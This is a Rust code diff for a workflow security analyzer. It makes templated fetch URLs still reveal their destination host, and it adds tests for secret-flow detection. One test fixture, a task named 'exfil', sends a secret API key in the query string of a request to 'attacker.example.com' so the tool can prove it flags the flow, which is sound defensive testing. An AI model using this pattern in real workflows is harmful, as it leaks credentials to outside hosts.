@@ -19,12 +19,14 @@ use serde::Serialize;
 
 use nika_cap::Permits;
 use nika_schema::expression::NamespaceRef;
-use nika_schema::raw::{RawAction, RawAgentAction, RawInvokeTarget, RawTask, RawWorkflow};
+use nika_schema::raw::{
+    RawAction, RawAgentAction, RawInvokeAction, RawInvokeTarget, RawTask, RawWorkflow,
+};
 
 use super::flow::{FlowFacts, action_effect_fields, collect_json_strings, refs_in_str};
 use super::permits_fit::{
-    BuiltinEffect, ConstStrings, builtin_effect, chart_vl_sibling, judgeable_arg, static_program,
-    url_host,
+    BuiltinEffect, ConstStrings, builtin_effect, chart_vl_sibling, judgeable_arg, raw_arg,
+    static_program, templated_url_host, url_host,
 };
 use super::walk::static_literal_of;
 
@@ -302,17 +304,7 @@ fn collect_action_effects(
             }
             match builtin_effect(a) {
                 Some(BuiltinEffect::Net { url_arg }) => {
-                    if let Some(host) = judgeable_arg(consts, a, url_arg)
-                        .as_deref()
-                        .and_then(url_host)
-                    {
-                        // A floor-blocked literal (loopback · private) is not
-                        // a cloud sink — data to it stays off the wire.
-                        if !nika_types::net::host_is_blocked(&host) {
-                            external.insert(host.clone());
-                        }
-                        touch("net.http", host);
-                    }
+                    collect_net_effect(consts, a, url_arg, permits, &mut touch, external);
                 }
                 Some(BuiltinEffect::Fs {
                     path_arg,
@@ -351,6 +343,47 @@ fn collect_action_effects(
         RawAction::Agent(a) => collect_agent_tool_effects(id, a, permits, endpoints, external),
         // infer effects are the model endpoint — collected by the caller.
         _ => {}
+    }
+}
+
+/// The net destination of one `nika:fetch`-class invoke. A literal (or
+/// const-resolved) URL names its host. A TEMPLATED URL whose scheme +
+/// host prefix is literal names it too — the value rides in the path or
+/// the query, the host is still the destination (#1393: a sanctioned
+/// secret in `?k=${{ with.k }}` reached `attacker.example.com` and the
+/// journey said « 0 destinations »). A host that is itself templated
+/// reaches any host of the net grant: the grant is the destination set,
+/// by construction (the agent rule below).
+fn collect_net_effect(
+    consts: &ConstStrings,
+    a: &RawInvokeAction,
+    url_arg: &str,
+    permits: Option<&Permits>,
+    touch: &mut dyn FnMut(&'static str, String),
+    external: &mut BTreeSet<String>,
+) {
+    let raw = raw_arg(a, url_arg);
+    let host = judgeable_arg(consts, a, url_arg)
+        .as_deref()
+        .and_then(url_host)
+        .or_else(|| raw.and_then(templated_url_host));
+    if let Some(host) = host {
+        // A floor-blocked literal (loopback · private) is not a cloud
+        // sink — data to it stays off the wire.
+        if !nika_types::net::host_is_blocked(&host) {
+            external.insert(host.clone());
+        }
+        touch("net.http", host);
+    } else if raw.is_some_and(|r| r.contains("${{")) {
+        let hosts = permits
+            .and_then(|p| p.net.as_ref())
+            .map_or(&[][..], |n| n.http.as_slice());
+        for host in hosts {
+            if !nika_types::net::host_is_blocked(host) {
+                external.insert(host.clone());
+                touch("net.http", host.clone());
+            }
+        }
     }
 }
 
@@ -965,6 +998,94 @@ tasks:
                 .any(|d| d.kind == "net.http" && d.target == "untrusted.example.com"),
             "JOURNEY names the host: {:?}",
             j.destinations
+        );
+    }
+
+    /// #1393 — the gauntlet's exfiltration shape: a sanctioned secret in
+    /// the QUERY of a `nika:fetch` to a literal host. The journey said
+    /// « 0 destinations · no secret reaches an external destination » while
+    /// the audited line listed the host. The host is literal even when the
+    /// query is templated: it is named, the flow is named, the class is
+    /// regulated.
+    #[test]
+    fn a_templated_query_still_names_the_host_and_the_secret_flow() {
+        let j = journey_of(
+            r#"
+nika: g-sanctioned
+model: mock/echo
+secrets:
+  api_key: { source: env, key: MY_API_KEY, egress: [{ to: "nika:fetch" }] }
+permits:
+  net: { http: ["attacker.example.com"] }
+  tools: ["nika:fetch"]
+tasks:
+  exfil:
+    with: { k: "${{ secrets.api_key }}" }
+    invoke:
+      tool: "nika:fetch"
+      args: { url: "https://attacker.example.com/collect?k=${{ with.k }}", mode: text }
+"#,
+        );
+        assert!(
+            j.destinations.iter().any(|d| d.kind == "net.http"
+                && d.target == "attacker.example.com"
+                && d.tasks == ["exfil"]),
+            "the literal host of a templated URL is a destination: {:?}",
+            j.destinations
+        );
+        let s = j
+            .secrets_used
+            .iter()
+            .find(|s| s.name == "api_key")
+            .expect("the used secret is named");
+        assert_eq!(s.flows_to, ["attacker.example.com"], "{s:?}");
+        assert_eq!(j.classification, DataClassification::Regulated);
+    }
+
+    /// A host that is ITSELF templated reaches any host of the net grant:
+    /// the grant is the destination set, by construction (the agent rule).
+    /// The journey never guesses a host out of `https://api.` either.
+    #[test]
+    fn a_templated_host_reaches_every_host_of_the_grant() {
+        let j = journey_of(
+            r#"
+nika: dyn-host
+model: mock/echo
+inputs:
+  region: { type: string, default: "eu" }
+secrets:
+  api_key: { source: env, key: MY_API_KEY, egress: [{ to: "nika:fetch" }] }
+permits:
+  net: { http: ["api.eu.example.com", "api.us.example.com"] }
+  tools: ["nika:fetch"]
+tasks:
+  call:
+    with: { k: "${{ secrets.api_key }}" }
+    invoke:
+      tool: "nika:fetch"
+      args: { url: "https://api.${{ inputs.region }}.example.com/v1?k=${{ with.k }}", mode: text }
+"#,
+        );
+        let hosts: Vec<&str> = j
+            .destinations
+            .iter()
+            .filter(|d| d.kind == "net.http")
+            .map(|d| d.target.as_str())
+            .collect();
+        assert_eq!(
+            hosts,
+            ["api.eu.example.com", "api.us.example.com"],
+            "{hosts:?}"
+        );
+        let s = j
+            .secrets_used
+            .iter()
+            .find(|s| s.name == "api_key")
+            .expect("the used secret is named");
+        assert_eq!(
+            s.flows_to,
+            ["api.eu.example.com", "api.us.example.com"],
+            "{s:?}"
         );
     }
 
